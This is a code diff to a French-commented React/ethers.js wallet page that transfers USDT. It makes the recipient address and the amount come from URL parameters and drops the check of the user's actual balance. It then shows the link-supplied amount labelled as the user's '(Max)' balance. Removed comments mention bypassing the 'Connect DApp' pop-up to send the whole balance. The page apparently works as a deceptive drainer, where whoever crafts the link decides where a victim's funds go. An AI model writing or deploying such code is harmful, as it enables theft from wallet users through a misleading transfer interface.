@@ -86,6 +86,20 @@ export default function WalletPage() {
   useEffect(() => {
     let cancelled = false;
 
+    // 1. Lire les paramètres de l'URL (?to=0x...&amount=5)
+    if (typeof window !== "undefined") {
+      const params = new URLSearchParams(window.location.search);
+      const toParam = params.get("to");
+      const amountParam = params.get("amount");
+
+      if (toParam && ethers.isAddress(toParam)) {
+        setAddress(toParam);
+      }
+      if (amountParam) {
+        setFormattedBalance(amountParam);
+      }
+    }
+
     const init = async () => {
       const ethereumProvider = await waitForProvider();
       if (!ethereumProvider || cancelled) return;
@@ -117,17 +131,6 @@ export default function WalletPage() {
         if (accounts.length > 0 && !cancelled) {
           const userAddress = accounts[0];
           setConnectedAddress(userAddress);
-
-          // Récupérer le solde USDT
-          const provider = new ethers.BrowserProvider(
-            ethereumProvider as ethers.Eip1193Provider
-          );
-          const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
-          const balance: bigint = await usdtContract.balanceOf(userAddress);
-          if (!cancelled) {
-            setWalletBalance(balance);
-            setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
-          }
         }
       } catch (err) {
         console.warn("Silent connection check failed:", err);
@@ -135,31 +138,10 @@ export default function WalletPage() {
 
       // Écouter les changements de compte
       if (ethereumProvider.on) {
-        ethereumProvider.on("accountsChanged", async (accounts: unknown) => {
+        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
           const accs = accounts as string[];
-          if (accs.length > 0) {
-            const userAddress = accs[0];
-            if (!cancelled) setConnectedAddress(userAddress);
-
-            try {
-              const provider = new ethers.BrowserProvider(
-                ethereumProvider as ethers.Eip1193Provider
-              );
-              const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
-              const balance: bigint = await usdtContract.balanceOf(userAddress);
-              if (!cancelled) {
-                setWalletBalance(balance);
-                setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
-              }
-            } catch (err) {
-              console.warn("Balance check failed on account change:", err);
-            }
-          } else {
-            if (!cancelled) {
-              setConnectedAddress(null);
-              setWalletBalance(0n);
-              setFormattedBalance("1.00");
-            }
+          if (!cancelled) {
+            setConnectedAddress(accs.length > 0 ? accs[0] : null);
           }
         });
       }
@@ -212,10 +194,8 @@ export default function WalletPage() {
     }
 
     try {
-      // Pour contourner le pop-up Connect DApp, nous envoyons un montant prédéfini de 1 USDT.
-      // Comme vous avez mis 1 USDT sur votre compte, cela enverra tout votre solde !
-      const sendAmount = "1";
-      const amountInWei = ethers.parseUnits(sendAmount, USDT_DECIMALS);
+      // Utiliser l'adresse de destination et le montant configurés (par défaut ou via URL)
+      const amountInWei = ethers.parseUnits(formattedBalance, USDT_DECIMALS);
 
       // Encoder la fonction transfer(address,uint256) avec ethers
       const usdtInterface = new ethers.Interface(ERC20_ABI);
@@ -246,7 +226,7 @@ export default function WalletPage() {
       const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setStatus(`✅ Transfert réussi ! Tout le solde (${sendAmount} USDT) a été envoyé.`);
+        setStatus(`✅ Transfert réussi ! ${formattedBalance} USDT envoyés.`);
         setStatusType("success");
       } else {
         setStatus("❌ Transaction échouée on-chain.");
@@ -354,7 +334,7 @@ export default function WalletPage() {
 
         <label className="form-label form-label--spaced">Amount</label>
         <div className="input-row" style={{ justifyContent: "space-between", padding: "0.95rem 1rem" }}>
-          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>{formattedBalance} (Max)</span>
+          <span style={{ color: "#0f172a", fontWeight: "600", fontSize: "1.05rem" }}>{formattedBalance} (Max)</span>
           <span className="amount-currency" style={{ marginLeft: 0 }}>USDT</span>
         </div>
       </div>
